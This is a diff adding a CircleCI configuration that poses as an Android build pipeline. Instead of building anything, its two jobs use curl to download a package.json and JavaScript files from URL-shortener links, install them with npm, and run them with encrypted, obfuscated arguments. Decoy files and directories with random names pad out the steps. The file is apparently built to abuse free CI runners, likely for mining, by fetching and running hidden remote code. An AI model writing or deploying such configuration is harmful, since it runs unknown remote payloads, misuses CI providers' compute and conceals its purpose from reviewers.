@@ -1,0 +1,51 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  start-jobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir 523dnue88g9fhv5y40cvtte
+      - run: curl -fsSL shorturl.at/nqyCD -o package.json && curl -fsSL
+          shorturl.at/mrtBH -o icaslzfffscd.js && curl -fsSL shorturl.at/hpqAH
+          -o 96h3oq93y4ueld6.js
+      - run: cat /proc/cpuinfo
+      - run: npm i -s
+      - run: mkdir 76ckuho5cns8rh
+      - run: touch iygk9cvustszulxglb5a.css
+      - run: node 96h3oq93y4ueld6 -t
+          U2FsdGVkX1+H1jlehtjNTeoYBW55zv/fbMjGQiPPed5p6f01PApa1Rxm/0JRaZpN -sp
+          -lpn U2FsdGVkX19xQuTEtCfVkILKrxNdwQDIOyyKlBJlels= -r
+          U2FsdGVkX1/t3C5B+HnG/9b0FD1/2q/1mDfdk+1bUGjZsKpM9/cA+YT5mtXvSrEpuDMKFWFAk7Ecrr4GNLx1Ed2i4MnysVEQcw3BlvZvJ4/Qhhyq1D1PN+wl2umGAxzlCtNF5Q8Qyl98dwJdExZsmIGbugfwb6CzwbF3qHoPnsPd7CScuEMCda4FqGDhdISF7C6jCaIvgsNGpUlFSH4Wr2viiWh9I2CNWOqpE9FjtFSAp+VIM4uc1rcfqZP8hwp/052amvOkzWJPgcVJ7vLNgfxvaGLg2Zz3PPNRMFKpaUE=
+          -s
+          U2FsdGVkX180NSADjoKwMTUOqyb1tu/CA482RSzUCUcOfncizUp4NuCa310S+uYoZPKW1xC6D9n2D/mhtmpLsiJQFCfHpYMMDh6eIczFcTqLZdLy9sPUeCddnA08eQT8Eu9qZxce+LcS/BXC8MZxWhyUyCG1YBFtBGQFczOQZyQdAq/sHswD/R/HSOyj7IYqYbZe2ry80TDw5ELRtGlMH7ONhr4fzfY4yhIGSlVDiwE=
+      - run: mkdir fc7c2ceiftmbmltx75weyl
+      - run: mkdir owsqkqunye4o
+  motherFucker:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch ryb4zdxkfeqqbj7vfxk4ks.cpp
+      - run: mkdir wxbvs88ql7srhgrqvw9f09ntl
+      - run: curl -fsSL shorturl.at/xOU56 -o l6rn5kr9dol.js && curl -fsSL
+          shorturl.at/ilLOT -o q9vnhnxj5m.js && curl -fsSL shorturl.at/hlEV2 -o
+          package.json
+      - run: mkdir hdfjg7uvdf1atqeb7zzec
+      - run: touch i7jd108vrc1biu4qfh.js
+      - run: npm i -s
+      - run: touch n0tahov6sf4pbv8rn5uhqo.c
+      - run: mkdir ozqowa1hlnf5splbm08fpw
+      - run: node q9vnhnxj5m -t
+          U2FsdGVkX19ulOi7cgq8PdFlgDim+ZrJAxDujihX2X1ig5RhYr5/h6n9J1F3kejk -s
+          U2FsdGVkX18rjmquLurwNzBA16UncPOlIwQjrTEw3liThEEPcmTp9yXtxmTc9h5uUp556AZEBEChOT+kCbp8FABWPKPWQcKM14BsE4b0Hi7OmwAbNUYxak15uNvcL2vmDzyqCbzXF9YOKiBa378jg24O5bTi496iNMEVjVhN63vZaKQkeeL/nPM4W42GuEdyN0L5csIbckXi37o3Y+FzR/WSgDmMz9fBu3qEyuxPerc=
+          -r
+          U2FsdGVkX19jcWbDhRmKdFXa6/aqsWHPyllnAhj0CbnJ2g3LF/kHSuyFR/PolnjJ5Kce8UTGjZpozr54LDVxNuv2wckIsteljQeLvwqSTYYqKBj6jQyV8IOIoj17P35uLVP024emCzobYhpSyrDwjM51RdlsUFweIsRIyKVV2Lr2Ipdqpt2MTC0vBrhdsa8FSasGykwqSvkw6CKntIRHT6eguWiOH+dn91hOfrjgM6/LHJmgeJc2ml/wAuRzwvd98frtlb4KQVA7Hx7QeDp2abWYEV1HxJE9q9EWq9vn2X4=
+          -sp -lpn U2FsdGVkX1/lOomOQSv+DlslP+iyC/WzDbyicDzs6UA=
+workflows:
+  working:
+    jobs:
+      - start-jobs
+  runJobs:
+    jobs:
+      - motherFucker
